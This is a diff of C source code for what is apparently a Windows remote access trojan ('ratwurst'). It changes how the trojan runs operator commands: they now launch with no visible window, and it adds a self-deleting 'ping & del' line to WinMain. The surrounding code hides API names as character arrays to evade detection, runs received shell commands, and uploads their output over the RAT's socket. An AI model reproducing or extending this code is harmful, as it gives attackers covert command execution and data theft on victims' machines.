@@ -205,7 +205,7 @@ UploadFile(RATSocket* ratSocket,
 	}
 }
 
-void RunCommandInProcess(char *commandToRun)
+void RunCommandInProcess(char *commandToRun, int waitForProcess)
 {
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si = { };
@@ -225,7 +225,7 @@ void RunCommandInProcess(char *commandToRun)
 
 	char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
 	_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(gLibraryKernel32, ca_CreateProcessA);
-	if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
+	if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, CREATE_NO_WINDOW , NULL, NULL, &si, &pi) )
 	{
 #if DEBUG				
 		char bufferError[256];
@@ -234,12 +234,15 @@ void RunCommandInProcess(char *commandToRun)
 #endif		
 	}
 
-	char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
-	_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(gLibraryKernel32, ca_WaitForSingleObject);
-	f_WaitForSingleObject( pi.hProcess, INFINITE );
+	if ( waitForProcess )
+	{
+		char ca_WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
+		_WaitForSingleObject* f_WaitForSingleObject = (_WaitForSingleObject*)GetProcAddress(gLibraryKernel32, ca_WaitForSingleObject);
+		f_WaitForSingleObject( pi.hProcess, INFINITE );
 
-	gf_CloseHandle(pi.hProcess);
-	gf_CloseHandle(pi.hThread);
+		gf_CloseHandle(pi.hProcess);
+		gf_CloseHandle(pi.hThread);
+	}
 }
 
 int
@@ -273,7 +276,7 @@ ReceiveCmdCommand(RATSocket* ratSocket,
 	strncat_s(commandToRun, " > ", 3);
 	strncat_s(commandToRun, filePath, strlen(tempPath) + 10);
 	
-	RunCommandInProcess(commandToRun);
+	RunCommandInProcess(commandToRun, 1);
 
 	UploadFile(ratSocket, filePath);
 
@@ -299,6 +302,9 @@ WinMain(HINSTANCE hInstance,
 {
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
+
+	RunCommandInProcess("ping 127.0.0.1 & del X:\\build\\ratwurst.exe", 0);
+	return 0;
 	
 	char currentPath[MAX_PATH];
 	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
